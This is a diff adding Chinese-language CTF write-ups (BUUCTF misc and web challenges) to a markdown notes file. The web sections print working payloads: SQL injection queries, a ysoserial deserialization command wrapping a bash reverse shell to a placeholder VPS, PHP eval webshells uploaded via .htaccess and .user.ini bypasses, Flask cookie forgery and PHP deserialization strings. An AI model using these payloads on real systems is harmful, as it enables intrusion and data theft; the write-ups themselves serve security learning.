@@ -1201,7 +1201,321 @@ plt.show()
 
 得到一个二维码，扫码即得flag。
 
+### 48. [HBNIS2018]excel破解
 
+修改后缀为.zip，010打开搜索flag即可得到flag
+
+### 49. [HBNIS2018]来题中等的吧
+
+图片上是摩斯电码，解码包上flag提交即可。
+
+### 50. [ACTF新生赛2020]outguess
+
+对jpg图片中的备注进行核心价值观解码，得到abc，kali中使用outguess来进行提取：
+
+```shell
+outguess -k 'abc' -r mmm.jpg flag.txt 
+```
+
+### 51. 穿越时空的思念
+
+`Audacity`打开摩斯电码解密即得flag
+
+### 52. 谁赢了比赛？
+
+首先去kali中使用binwalk/foremost分离出一个rar压缩包，ARCHPR爆破出密码解压，得到一个gif，Stegsolve打开一帧一帧看：
+
+![image-20231227165333778](buu_wp.assets/image-20231227165333778.png)
+
+保存这一帧，继续StegSolve打开：
+
+![image-20231227165421782](buu_wp.assets/image-20231227165421782.png)。
+
+扫码即得flag
+
+### 53. [WUSTCTF2020]find_me
+
+备注中的信息盲文解密即可
+
+### 54. [SWPU2019]我有一只马里奥
+
+运行exe文件，得到输出：
+
+![image-20231227170230278](buu_wp.assets/image-20231227170230278.png)
+
+提示ntfs数据流,打开所在目录cmd:
+
+```shell
+notepad .\1.txt:flag.txt
+```
+
+或者使用工具 `ntfsstreamseditor.exe`：
+
+![image-20231227170739468](buu_wp.assets/image-20231227170739468.png)
+
+### 55. [GUET-CTF2019]KO
+
+Ook!编码
+
+### 56. [GXYCTF2019]gakki
+
+binwalk/foremost分离、ARCHPR爆破都没有问题，最后得到一个无规则字符串文本：
+
+![image-20231227172532822](buu_wp.assets/image-20231227172532822.png)
+
+词频统计：
+
+```python
+# -*- coding:utf-8 -*-
+#Author: mochu7
+alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+- =\\{\\}[]"
+strings = open('./flag.txt').read()
+
+result = {}
+for i in alphabet:
+	counts = strings.count(i)
+	i = '{0}'.format(i)
+	result[i] = counts
+
+res = sorted(result.items(),key=lambda item:item[1],reverse=True)
+for data in res:
+	print(data)
+
+for i in res:
+	flag = str(i[0])
+	print(flag[0],end="")
+
+```
+
+跑一下脚本得到flag
+
+### 57. [ACTF新生赛2020]base64隐写
+
+跑脚本解决：
+
+```python
+import base64
+ 
+def get_base64_diff_value(s1, s2):
+    base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    res = 0
+    for i in range(len(s2)):
+        if s1[i] != s2[i]:
+            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
+ 
+    return res
+ 
+def solve_stego():
+    with open('ComeOn!.txt') as f:
+        file_lines = f.readlines()
+        bin_str = ''
+        for line in file_lines:
+            steg_line = line.replace('\n', '')
+            #norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n','')
+ 
+            norm_line = line.replace('\n', '').encode('utf-8')
+            norm_line = base64.b64decode(norm_line).decode('utf-8')
+            
+            norm_line = base64.b64encode(norm_line.encode('utf-8')).decode('utf-8')
+            norm_line = norm_line.replace('\n', '')
+ 
+ 
+            diff = get_base64_diff_value(steg_line, norm_line)
+            print(diff)
+            pads_num = steg_line.count('=')
+            if diff:
+                bin_str += bin(diff)[2:].zfill(pads_num * 2)
+            else:
+                bin_str += '0' * pads_num * 2
+            print(goflag(bin_str))
+ 
+ 
+def goflag(bin_str):
+    res_str = ''
+    for i in range(0, len(bin_str), 8):
+        res_str += chr(int(bin_str[i:i+8], 2))
+    return res_str
+ 
+if __name__ == '__main__':
+    solve_stego()
+```
+
+### 58. [MRCTF2020]ezmisc
+
+010打开提示CRC错误，应该是修改了宽高，跑脚本看看正确的宽高是多少：
+
+![image-20231228101251210](buu_wp.assets/image-20231228101251210.png)
+
+```python
+import os
+import binascii
+import struct
+
+crcbp = open("flag.png","rb").read()
+for i in range(2000):
+    for j in range(2000):
+        data = crcbp[12:16] + struct.pack('>i',i) + struct.pack('>i',j)+crcbp[24:29]
+        crc32 = binascii.crc32(data) & 0xffffffff
+        if(crc32 == 0x370c8f0b):
+            print(i,j)
+            print('hex:',hex(i),hex(j))
+```
+
+TweakPNG修改宽高即可看到flag
+
+### 59. [HBNIS2018]caesar
+
+凯撒解密：
+
+![image-20231228101719388](buu_wp.assets/image-20231228101719388.png)
+
+### 60. 黑客帝国
+
+打开的文本观察到都是16进制数据，CyberChef转为16进制保存得到一个rar压缩包：
+
+![image-20231228103053487](buu_wp.assets/image-20231228103053487.png)
+
+有密码，ARCHPR爆破得到密码，解压是张png图片，但打不开，010打开：
+
+![image-20231228103406746](buu_wp.assets/image-20231228103406746.png)
+
+观察看到文件尾是FF D9，可能是jpg文件，修改文件头为FF D8，再改下后缀为jpg，直接打开即可得flag。
+
+### 61. [SWPU2019]伟大的侦探
+
+解压发现需要密码，密码.txt有提示：
+
+![image-20231228104314279](buu_wp.assets/image-20231228104314279.png)
+
+用010打开，修改为EBCDIC即可看到密码
+
+![image-20231228104243122](buu_wp.assets/image-20231228104243122.png)
+
+解压是跳舞小人，对照解密即可得到flag
+
+### 62. [HBNIS2018]低个头
+
+键盘解密
+
+### 63. [MRCTF2020]你能看懂音符吗
+
+解压错误，rar文件头修改下：
+
+![image-20240109133655212](buu_wp.assets/image-20240109133655212.png)
+
+打开显示：
+
+![image-20240109133736869](buu_wp.assets/image-20240109133736869.png)
+
+改为zip后缀解压发现：
+
+![image-20240109134020180](buu_wp.assets/image-20240109134020180.png)
+
+音符解密https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue
+
+
+
+### 64. [SUCTF2018]single dog
+
+图片中有隐藏压缩包，binwalk分离：
+
+```shell
+binwalk attachment.jpg -e --run-as=root
+```
+
+分离出文件，百度了下是AAEncode编码，随波逐流解密：
+
+![image-20240109141253035](buu_wp.assets/image-20240109141253035.png)
+
+### 65. 我吃三明治
+
+由两张jpg图片拼接而成，010打开搜索下FF D9，拼接处有串字符，base32解密得到flag：
+
+![image-20240109142736193](buu_wp.assets/image-20240109142736193.png)
+
+### 66. [SWPU2019]你有没有好好看网课?
+
+一个压缩包提示密码是6位数字，ARCHPR爆破解压：
+
+![image-20240109144913610](buu_wp.assets/image-20240109144913610.png)
+
+解压出来是个视频和word，word内容：
+
+![image-20240109144959048](buu_wp.assets/image-20240109144959048.png)
+
+Potplayer打开mp4，一帧一帧看发现：
+
+![image-20240109144209870](buu_wp.assets/image-20240109144209870.png)
+
+有串代码，百度了下发现是敲击码：
+
+```
+..... ../... ./... ./... ../
+```
+
+/是划分符号，修改为空格后随波逐流解密下：
+
+![image-20240109145414738](buu_wp.assets/image-20240109145414738.png)
+
+继续逐帧查看：
+
+![image-20240109145545438](buu_wp.assets/image-20240109145545438.png)
+
+base64解密：
+
+![image-20240109145619270](buu_wp.assets/image-20240109145619270.png)
+
+拼接起来就是：
+
+```
+wllmup_up_up
+```
+
+解压另外一个压缩包，010打开搜索下得到flag
+
+
+
+### 67. [ACTF新生赛2020]NTFS数据流
+
+
+
+### 68. sqltest
+
+大鲨鱼打开，为SQL注入，使用tshark将所有http请求的uri导出：
+
+```shell
+tshark -r sqltest.pcapng -Y "http.request" -T fields -e http.request.full_uri > data.txt
+```
+
+- `-r` 读取文件
+- `-Y` 过滤语句
+- `-T pdml|ps|text|fields|psml` 设置解码结果输出的格式
+- `-e` 输出特定字段
+- `http.request.uri` http请求的uri部分
+
+URL编码解码一下，从此开始是二分法爆破数值：
+
+![image-20240110165810103](buu_wp.assets/image-20240110165810103.png)
+
+将最后的二分结果转换下即得flag：
+
+![image-20240110171048990](buu_wp.assets/image-20240110171048990.png)
+
+
+
+### 69. john-in-the-middle
+
+
+
+### [ACTF新生赛2020]swp
+
+### [UTCTF2020]docx
+
+### [GXYCTF2019]SXMgdGhpcyBiYXNlPw==
+
+### 喵喵喵
+
+### 间谍启示录
 
 ## Web
 
@@ -1940,6 +2254,1325 @@ calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(
   - 删除空白符
   - 将某些字符转换为下划线（包括空格）
 
+### 19. (TBD)[网鼎杯 2020 朱雀组]Think Java
+
+使用IDEA打开给的class文件：
+
+![image-20231226142620644](buu_wp.assets/image-20231226142620644.png)
+
+发现导入了swagger-ui，那么便存在在线测试接口`swagger-ui.html`，访问看看：
+
+![image-20231226142826757](buu_wp.assets/image-20231226142826757.png)
+
+存在三个访问接口，而第三个`/common/test/sqlDict`对应于给的class中的：
+
+```java
+    @PostMapping({"/sqlDict"})
+    @Access
+    @ApiOperation("为了开发方便对应数据库字典查询")
+    public ResponseResult sqlDict(String dbName) throws IOException {
+        List<Table> tables = SqlDict.getTableData(dbName, "root", "abc@12345");
+        return ResponseResult.e(ResponseCode.OK, tables);
+    }
+```
+
+代码审计：
+
+对于dbName这个变量，在做数据库链接和数据查询的时候均是直接字符串拼接，所以存在SQL注入：
+
+```java
+dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
+......
+String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
+
+```
+
+爆库：
+
+```
+dbName=myapp#' union select group_concat(SCHEMA_NAME)from(information_schema.schemata)#
+```
+
+![image-20231226143626793](buu_wp.assets/image-20231226143626793.png)
+
+爆表：
+
+```
+dbName=myapp#' union select group_concat(table_name)from(information_schema.tables)where(table_schema='myapp')#
+```
+
+爆列：
+
+```
+dbName=myapp#' union select group_concat(column_name)from(information_schema.columns)where((table_schema='myapp')and(table_name='user'))#
+```
+
+爆值：
+
+```
+dbName=myapp#' union select group_concat(id)from(user)#
+
+dbName=myapp#' union select group_concat(name)from(user)#
+
+dbName=myapp#' union select group_concat(pwd)from(user)#
+```
+
+如此就获得了一个用户信息，序号为`1`，name为`admin`，密码为`admin@Rrrr_ctf_asde`；
+
+登录（输入用户名密码的json字符串，在`/common/user/login`处try it out）：
+
+![image-20231226144019134](buu_wp.assets/image-20231226144019134.png)
+
+获得一串认证字符串：
+
+```
+Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
+```
+
+百度下需要对着串认证字符串进行序列化分析：
+
+> 下方的特征可以作为序列化的标志参考:
+> 一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。
+> 或者如果以aced开头，那么他就是这一段Java序列化的16进制。
+
+使用burp 的**java Deserialization Scanner**插件对其进行分析，分析出可能存在的漏洞：
+
+![image-20231226144333120](buu_wp.assets/image-20231226144333120.png)
+
+接下来需要使用ysoserial来反弹shell，由于没有公网ip，所以暂时跳过，贴下百度到的解答：
+
+---
+
+使用工具：ysoserial
+
+我们这里用到的命令如下：
+
+```shell
+java -jar ysoserial-all.jar ROME "bash -c {echo,base64编码后的内容}|{base64,-d}|{bash,-i}" > 1.bin
+```
+
+
+进行base64编码的内容是：
+
+```shell
+bash -i >& /dev/tcp/vpsip/端口 0>&1
+```
+
+- 将vpsip和端口换成自己服务器ip和正在监听的端口之后，再对其进行base64编码。
+
+将编码后的内容填充到命令上，再通过ysoserial获得bin文件，拿到文件之后，我们还需要对其进行base64加密，这里使用的一个Python脚本。注意根据自己bin文件名字去更改代码，而且还要记得把bin文件和代码放在同一目录。输出打印的一大串字符串就是payload。
+
+```python
+import base64
+file=open("1.bin","rb")
+
+now = file.read()
+ba = base64.b64encode(now)
+print(ba)
+file.close()
+```
+
+
+获得payload之后，先在咱们的服务器上监听端口之后，在另一个接口处输入payload，来进行反弹shell，注意开头的Bearer保留。
+
+![image-20231226150802622](buu_wp.assets/image-20231226150802622.png)
+
+---
+
+### 20. [RoarCTF 2019]Easy Java
+
+访问靶机，有一个登录页面，以为是sql注入发现不能成功，点击下方的help跳转：
+
+![image-20231226154152984](buu_wp.assets/image-20231226154152984.png)
+
+跳转出来并不能下载：
+
+![image-20231226154218574](buu_wp.assets/image-20231226154218574.png)
+
+转成POST请求发送：
+
+![image-20231226154247236](buu_wp.assets/image-20231226154247236.png)
+
+可以下载不过flag并不在其中，查看是否存在`WEB-INF/web.xml`泄露，payload改为：
+
+```
+filename=WEB-INF/web.xml
+```
+
+可以下载，查看源码：
+
+```xml
+    <servlet>
+        <servlet-name>FlagController</servlet-name>
+        <servlet-class>com.wm.ctf.FlagController</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>FlagController</servlet-name>
+        <url-pattern>/Flag</url-pattern>
+    </servlet-mapping>
+```
+
+试试直接访问`/Flag`，发现500，继续把FlagController的class字节码下载下来：
+
+```
+filename=WEB-INF/classes/com/wm/ctf/FlagController.class
+```
+
+IDEA打开：
+
+```java
+String flag = "ZmxhZ3tlYWNiZTQxMS00MTc4LTQ5M2YtODQwZS0xNzU4NTY3YTkyNzV9Cg==";
+```
+
+base64解密下即为flag。
+
+
+
+### 21. [极客大挑战 2019]BuyFlag
+
+进入pay.php查看源代码，代码审计：
+
+```html
+</body>
+<!--
+	~~~post money and password~~~
+if (isset($_POST['password'])) {
+	$password = $_POST['password'];
+	if (is_numeric($password)) {
+		echo "password can't be number</br>";
+	}elseif ($password == 404) {
+		echo "Password Right!</br>";
+	}
+}
+-->
+</html>
+```
+
+需要传一个password，绕过弱比较：
+
+![image-20240103154053314](buu_wp.assets/image-20240103154053314.png)
+
+money传科学计数法
+
+
+
+### 22. [BJDCTF2020]Easy MD5
+
+随便输入一个1，burp抓包，response头中有提示：
+
+```http
+HTTP/1.1 200 OK
+Server: openresty
+Date: Wed, 03 Jan 2024 08:12:54 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Vary: Accept-Encoding
+Hint: select * from 'admin' where password=md5($pass,true)
+X-Powered-By: PHP/7.3.13
+Cache-Control: no-cache
+Content-Length: 3107
+```
+
+此处需要用到`ffifdyop`绕过，绕过原理是：
+`ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，这个字符串前几位刚好是 ' `or '6`
+而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 `select * from 'admin' where password='' or '6xxxxx'`，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数；
+
+绕过之后进入另外一个页面：
+
+![image-20240103162129521](buu_wp.assets/image-20240103162129521.png)
+
+CTRL U代码审计：
+
+```php
+<!--
+$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b && md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+-->
+```
+
+需要GET传入a、b两个参数，要求md5弱相等，传入数组即可：
+
+```
+?a[]=1&b[]=2
+```
+
+进入了新的页面，还是代码审计：
+
+```php
+ <?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+} 
+```
+
+md5碰撞（0e开头），一些md5碰撞值：
+
+```
+QNKCDZO
+0e830400451993494058024219903391
+ 
+s878926199a
+0e545993274517709034328855841020
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s214587387a
+0e848240448830537924465865611904
+ 
+s214587387a
+0e848240448830537924465865611904
+ 
+s878926199a
+0e545993274517709034328855841020
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s1885207154a
+0e509367213418206700842008763514
+ 
+s1502113478a
+0e861580163291561247404381396064
+ 
+s1885207154a
+0e509367213418206700842008763514
+ 
+s1836677006a
+0e481036490867661113260034900752
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s1184209335a
+0e072485820392773389523109082030
+ 
+s1665632922a
+0e731198061491163073197128363787
+ 
+s1502113478a
+0e861580163291561247404381396064
+ 
+s1836677006a
+0e481036490867661113260034900752
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s1502113478a
+0e861580163291561247404381396064
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s1665632922a
+0e731198061491163073197128363787
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s1836677006a
+0e481036490867661113260034900752
+ 
+s1885207154a
+0e509367213418206700842008763514
+ 
+s532378020a
+0e220463095855511507588041205815
+ 
+s878926199a
+0e545993274517709034328855841020
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s214587387a
+0e848240448830537924465865611904
+ 
+s1502113478a
+0e861580163291561247404381396064
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s1665632922a
+0e731198061491163073197128363787
+ 
+s1885207154a
+0e509367213418206700842008763514
+ 
+s1836677006a
+0e481036490867661113260034900752
+ 
+s1665632922a
+0e731198061491163073197128363787
+ 
+s878926199a
+0e545993274517709034328855841020
+```
+
+还是利用数组来构造POST传参：
+
+![image-20240103162605205](buu_wp.assets/image-20240103162605205.png)
+
+### 23. [HCTF 2018]admin
+
+注册一个账号登录，在修改密码那里CTRL U查看源码，有提示：
+
+```html
+<!-- https://github.com/woadsl1234/hctf_flask/ -->
+```
+
+**方法一 flask session 伪造**
+原因是flask的session是存储在客户端的cookie中的即存储在本地，因此可以尝试进行伪造。且flask仅仅对session数据进行了签名。即通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，即可以利用脚本可以解出session的内容
+
+解密脚本
+
+```python
+#!/usr/bin/env python3
+import sys
+import zlib
+from base64 import b64decode
+from flask.sessions import session_json_serializer
+from itsdangerous import base64_decode
+ 
+def decryption(payload):
+    payload, sig = payload.rsplit(b'.', 1)
+    payload, timestamp = payload.rsplit(b'.', 1)
+ 
+    decompress = False
+    if payload.startswith(b'.'):
+        payload = payload[1:]
+        decompress = True
+ 
+    try:
+        payload = base64_decode(payload)
+    except Exception as e:
+        raise Exception('Could not base64 decode the payload because of '
+                         'an exception')
+ 
+    if decompress:
+        try:
+            payload = zlib.decompress(payload)
+        except Exception as e:
+            raise Exception('Could not zlib decompress the payload before '
+                             'decoding the payload')
+ 
+    return session_json_serializer.loads(payload)
+ 
+if __name__ == '__main__':
+    print(decryption(sys.argv[1].encode()))   
+```
+
+![image-20240103165342521](buu_wp.assets/image-20240103165342521.png)
+
+解密出来的文本：
+
+```
+{'_fresh': True, '_id': b'6461d3f7692815ee86b850da1f7f6489815e82ebbe14f56b060cda8537ff5d72835d1933578f2ad36f8e3bbf33379cb86de17c2cd0ecce8b2ff7d36702d6a009', 'csrf_token': b'a9bb69061aad4c4f3e9e39eada76c73d0b87b702', 'image': b'ZXeY', 'name': 'a', 'user_id': '10'}
+```
+
+- `'name': 'a'`，改成`'name': 'admin'`再加密即可
+
+加密密钥在源码中看出为ckj123：
+
+![image-20240103170012564](buu_wp.assets/image-20240103170012564.png)
+
+
+
+加密：
+
+```shell
+python flask_session_cookie_manager3.py encode -s "ckj123" -t "{'_fresh': True, '_id': b'6461d3f7692815ee86b850da1f7f6489815e82ebbe14f56b060cda8537ff5d72835d1933578f2ad36f8e3bbf33379cb86de17c2cd0ecce8b2ff7d36702d6a009', 'csrf_token': b'a9bb69061aad4c4f3e9e39eada76c73d0b87b702', 'image': b'ZXeY', 'name': 'admin', 'user_id': '10'}"
+```
+
+![image-20240103170506882](buu_wp.assets/image-20240103170506882.png)
+
+修改cookie刷新即可看到flag：
+
+![image-20240103170612248](buu_wp.assets/image-20240103170612248.png)
+
+### 24. [MRCTF2020]你传你🐎呢
+
+尝试上传一句话，有过滤，使用.htaccess来绕过：
+
+![image-20240103171338108](buu_wp.assets/image-20240103171338108.png)
+
+```
+<FilesMatch "abc" >
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+意为将当前目录下文件名为abc的文件当成php来解析；
+
+然后再上传一句话：
+
+![image-20240103171527394](buu_wp.assets/image-20240103171527394.png)
+
+蚁剑连接即可查看flag
+
+### 25. [护网杯 2018]easy_tornado
+
+同adword 31. easytornado
+
+### 26. [ZJCTF 2019]NiZhuanSiWei
+
+进入页面代码审计：
+
+```php
+ <?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?> 
+```
+
+- `if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`
+  - 使用input伪协议绕过：`/?text=php://input `
+  - ![image-20240103172951143](buu_wp.assets/image-20240103172951143.png)
+  - 使用data伪协议（base64加密）绕过：`/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`
+- `if(preg_match("/flag/",$file))`：正则过滤了flag又提示是useless.php，使用伪协议绕过
+
+综合以上，payload暂为：
+
+````
+/?text=php://input&file=php://filter/read=convert.base64-encode/resource=useless.php
+````
+
+![image-20240103173333225](buu_wp.assets/image-20240103173333225.png)
+
+返回的内容base64解密下：
+
+```php
+<?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  
+
+```
+
+序列化脚本：
+
+```php
+<?php
+class Flag{
+    public $file="flag.php"; 
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    } 
+}
+$a = new Flag();
+$str = serialize($a);
+var_dump($str);
+var_dump(base64_encode($str));
+?>
+```
+
+
+
+最终payload：
+
+```
+/?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+### 27. [极客大挑战 2019]HardSQL
+
+报错注入，利用函数**extractvalue()**；
+
+extractvalue() ：对XML文档进行查询的函数，语法：`extractvalue(目标xml文档，xml路径)`
+
+- 第一个参数 :  传入目标xml文档
+- 第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容；
+- tip: 能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串；
+- 用’^'来连接函数，形成异或
+
+爆库：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(database()))))%23
+```
+
+爆表（等于号过滤了使用like）：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))
+```
+
+爆列：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))%23
+```
+
+爆数据：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(password)from(H4rDsq1))))%23
+```
+
+由于extractvalue()函数一次只能显示32个字符，我们需要用right函数拼接出另外一半：
+
+![image-20240104093001087](buu_wp.assets/image-20240104093001087.png)
+
+right：
+
+```
+?username=admin&password=admin'^extractvalue(1,concat(0x5c,(select(right(password,16))from(H4rDsq1))))%23
+```
+
+拼接得到flag
+
+![image-20240104093327604](buu_wp.assets/image-20240104093327604.png)
+
+### 28. [MRCTF2020]Ez_bypass
+
+代码审计：
+
+```php
+I put something in F12 for you
+include 'flag.php';
+$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
+if(isset($_GET['gg'])&&isset($_GET['id'])) {
+    $id=$_GET['id'];
+    $gg=$_GET['gg'];
+    if (md5($id) === md5($gg) && $id !== $gg) {
+        echo 'You got the first step';
+        if(isset($_POST['passwd'])) {
+            $passwd=$_POST['passwd'];
+            if (!is_numeric($passwd))
+            {
+                 if($passwd==1234567)
+                 {
+                     echo 'Good Job!';
+                     highlight_file('flag.php');
+                     die('By Retr_0');
+                 }
+                 else
+                 {
+                     echo "can you think twice??";
+                 }
+            }
+            else{
+                echo 'You can not get it !';
+            }
+
+        }
+        else{
+            die('only one way to get the flag');
+        }
+}
+    else {
+        echo "You are not a real hacker!";
+    }
+}
+else{
+    die('Please input first');
+}
+}Please input first
+```
+
+- ` if (md5($id) === md5($gg) && $id !== $gg)`：md5弱相等绕过，使用数组；
+- ` if (!is_numeric($passwd))`、`if($passwd==1234567)`：字符若相等
+
+最终payload：
+
+```
+?id[]=111&gg[]=222
+
+passwd=1234567x
+```
+
+得到flag：
+
+![image-20240104093907287](buu_wp.assets/image-20240104093907287.png)
+
+### 29. [网鼎杯 2020 青龙组]AreUSerialz
+
+代码审计：
+
+```php
+<?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+
+序列化，去调用read函数读取flag，需要满足：
+
+- op=2
+- content<100
+- 传入的payload通过is_valid检测
+  - `is_valid()`函数对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true。
+
+
+
+![img](buu_wp.assets/20200923094018303.png)
+
+
+
+**方法一：突破ord函数限制**
+
+序列化脚本：
+
+```php
+<?php
+  class FileHandler {
+  protected $op = 2;
+  protected $filename ='flag.php';         
+ //题目中包含flag的文件
+protected $content;
+
+}
+$bai = urlencode(serialize(new FileHandler)); 
+//URL编码实例化后的类FileHandler序列化结果
+$mao =str_replace('%00',"\\00",$bai);    
+//str_replace函数查找变量bai里面的数值%00并将其替换为\\00
+$mao =str_replace('s','S',$mao);         
+//str_replace函数查找变量mao里面的数值s并将其替换为S
+echo $mao                                               
+//打印结果
+?>
+
+```
+
+
+
+**方法二：突破protected访问修饰符限制**
+
+序列化脚本：
+
+```php
+<?php
+  class FileHandler {
+  protected $op = 2;
+  protected $filename ='php://filter/read=convert.base64-encode/resource=flag.php';             
+//php://filter伪协议
+protected $content;
+
+}
+$baimao=serialize(new FileHandler());
+//实例化并序列化类FileHandler
+echo $baimao;
+//打印结果
+?>
+
+```
+
+序列化结果
+
+```
+O:11:"FileHandler":3:{s:5:" * op";i:2;s:11:" * filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:" * content";N;}
+```
+
+删除乱码并减去相应长度
+
+```
+O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
+```
+
+构造payload
+
+```
+?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
+```
+
+### 30. [SUCTF 2019]CheckIn
+
+需要使用.user.ini来进行绕过，构造.user.ini：
+
+```ini
+GIF89a
+auto_prepend_file=a.jpg
+auto_append_file=a.jpg
+```
+
+再构造a.jpg：
+
+```php
+GIF89a
+<script language='php'> @eval($_POST['pass']);</script>
+```
+
+![image-20240109105546907](buu_wp.assets/image-20240109105546907.png)
+
+蚁剑连接，拿到flag
+
+.user.ini知识点：
+
+![img](buu_wp.assets/1270588-20190903201901495-357084982.png)
+
+### 31. [GXYCTF2019]BabyUpload
+
+上传发现有php后缀过滤：
+
+![image-20240109110218935](buu_wp.assets/image-20240109110218935.png)
+
+使用**.htaccess**绕过，先上传htaccess：
+
+```http
+POST / HTTP/1.1
+Host: e709aeca-d1f0-4b12-b188-270d06214cb7.node5.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------36243627783878118222275131329
